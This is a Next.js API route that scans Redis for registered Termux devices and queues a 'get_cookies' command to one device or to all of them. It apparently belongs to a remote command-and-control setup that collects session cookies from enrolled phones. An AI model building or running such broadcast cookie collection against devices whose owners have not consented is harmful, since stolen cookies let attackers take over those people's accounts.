import { NextRequest, NextResponse } from "next/server";
import { redis, termuxCommandQueueKey } from "@/lib/redis";

export const dynamic = "force-dynamic";

export async function POST(req: NextRequest) {
  try {
    const { deviceId } = (await req.json()) as { deviceId?: string };

    const deviceIds: string[] = [];

    if (deviceId) {
      deviceIds.push(deviceId);
    } else {
      let cursor = "0";
      do {
        const [next, keys] = await redis.scan(cursor, { match: "termux:device:*", count: 100 });
        cursor = next;
        for (const k of keys) {
          if (k.startsWith("termux:device:meta:")) continue;
          const raw = await redis.get<string>(k);
          if (!raw) continue;
          try {
            const d = JSON.parse(raw);
            if (d?.deviceId) deviceIds.push(d.deviceId);
          } catch {}
        }
      } while (cursor !== "0");
    }

    let queued = 0;
    for (const id of deviceIds) {
      const cmd = JSON.stringify({ type: "get_cookies", id: `cookie-${Date.now()}` });
      await redis.queuePush(termuxCommandQueueKey(id), cmd, { ttl: 300, maxLen: 20 });
      queued++;
    }

    return NextResponse.json({ ok: true, queued, devices: deviceIds.length });
  } catch (e: any) {
    return NextResponse.json({ ok: false, error: e.message }, { status: 500 });
  }
}
